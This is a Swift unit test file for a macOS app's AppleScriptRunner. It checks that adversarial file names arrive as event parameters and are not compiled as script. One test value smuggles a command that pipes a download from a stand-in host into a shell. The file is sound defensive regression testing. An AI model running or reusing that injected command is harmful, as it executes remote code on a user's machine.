// ABOUTME: Tests that AppleScriptRunner passes values as event parameters, not source text.
// ABOUTME: Adversarial file names must arrive as data and never as AppleScript code.

@testable import Atelier
import XCTest

/// These run real AppleScript, but only handlers that compute on strings — no
/// `tell application` — so nothing here needs an automation permission or opens
/// a window.
final class AppleScriptRunnerTests: XCTestCase {
    /// Hands each argument straight back, joined by a delimiter no input uses.
    private let echoSource = """
    on atelierecho(valueOne, valueTwo)
        return valueOne & "\u{1F}" & valueTwo
    end atelierecho
    """

    private func roundTrip(_ first: String, _ second: String) throws -> [String] {
        let result = try AppleScriptRunner.run(
            source: echoSource,
            handler: "atelierecho",
            arguments: [first, second]
        )
        return try XCTUnwrap(result).components(separatedBy: "\u{1F}")
    }

    // MARK: - Adversarial arguments survive as data

    func testDoubleQuoteIsAnArgumentNotASourceTerminator() throws {
        // The exploit from the original defect: a double quote closed the
        // AppleScript literal and everything after it was compiled as code.
        let name = #"x"; do script "curl evil.sh | sh"#
        XCTAssertEqual(try roundTrip("/bin/nvim", name), ["/bin/nvim", name])
    }

    func testBackslashSurvives() throws {
        XCTAssertEqual(try roundTrip("/bin/nvim", #"back\slash"#), ["/bin/nvim", #"back\slash"#])
    }

    func testEscapedQuoteSequenceSurvives() throws {
        // `\"` is an escaped quote to AppleScript's compiler — spliced into
        // source it would still end the literal one character later.
        let name = #"a\"; beep; --"#
        XCTAssertEqual(try roundTrip("/bin/nvim", name), ["/bin/nvim", name])
    }

    func testNewlineSurvives() throws {
        // A newline cannot appear in an AppleScript string literal at all, so
        // interpolating one produced a script that did not compile.
        XCTAssertEqual(try roundTrip("/bin/nvim", "new\nline"), ["/bin/nvim", "new\nline"])
    }

    func testSingleQuoteSurvives() throws {
        XCTAssertEqual(try roundTrip("/bin/nvim", "it's"), ["/bin/nvim", "it's"])
    }

    func testCombinedAdversarialNameSurvives() throws {
        let name = "all\"of'them\\and\nmore"
        XCTAssertEqual(try roundTrip("/bin/nvim", name), ["/bin/nvim", name])
    }

    func testArgumentsKeepTheirOrder() throws {
        XCTAssertEqual(try roundTrip("first", "second"), ["first", "second"])
    }

    // MARK: - The descriptor itself

    func testEventCarriesArgumentsAsAOneBasedList() {
        let event = AppleScriptRunner.event(handler: "atelierecho", arguments: ["a\"b", "c\\d"])
        let list = event.paramDescriptor(forKeyword: AEKeyword(keyDirectObject))
        XCTAssertEqual(list?.numberOfItems, 2)
        XCTAssertEqual(list?.atIndex(1)?.stringValue, "a\"b")
        XCTAssertEqual(list?.atIndex(2)?.stringValue, "c\\d")
    }

    func testEventNamesTheHandler() {
        let event = AppleScriptRunner.event(handler: "atelierecho", arguments: [])
        // 'snam' — the subroutine-name keyword.
        XCTAssertEqual(
            event.paramDescriptor(forKeyword: AEKeyword(0x736E_616D))?.stringValue,
            "atelierecho"
        )
    }

    // MARK: - Failures are reported, never swallowed

    func testUnknownHandlerThrows() {
        XCTAssertThrowsError(try AppleScriptRunner.run(
            source: echoSource,
            handler: "nosuchhandler",
            arguments: ["a", "b"]
        )) { error in
            guard case AppleScriptRunner.Failure.executionFailed = error else {
                return XCTFail("expected executionFailed, got \(error)")
            }
        }
    }

    func testUncompilableSourceThrows() {
        XCTAssertThrowsError(try AppleScriptRunner.run(
            source: "on ( this is not applescript",
            handler: "whatever",
            arguments: []
        )) { error in
            XCTAssertEqual(error as? AppleScriptRunner.Failure, .compileFailed)
        }
    }
}
